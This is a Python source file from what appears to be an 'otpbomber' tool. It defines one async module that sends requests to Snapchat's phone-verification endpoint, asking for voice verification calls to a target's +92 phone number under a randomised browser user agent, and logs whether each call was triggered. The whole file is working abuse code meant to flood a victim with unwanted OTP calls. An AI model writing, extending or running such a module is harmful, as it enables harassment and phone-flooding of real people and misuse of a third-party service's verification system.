from otpbomber.core import *
from otpbomber.localuseragent import *

async def snapchat_voice(phone, client, out):
    name = 'snapchat_voice'
    domain = 'snapchat.com'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/x-www-form-urlencoded'}
    payload = {'phone_number': f'+92{phone[-10:]}', 'method': 'voice', 'app_id': 'com.snapchat.android'}
    try:
        response = await client.post('https://accounts.snapchat.com/accounts/phone_verify_request', headers=headers, data=payload)
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})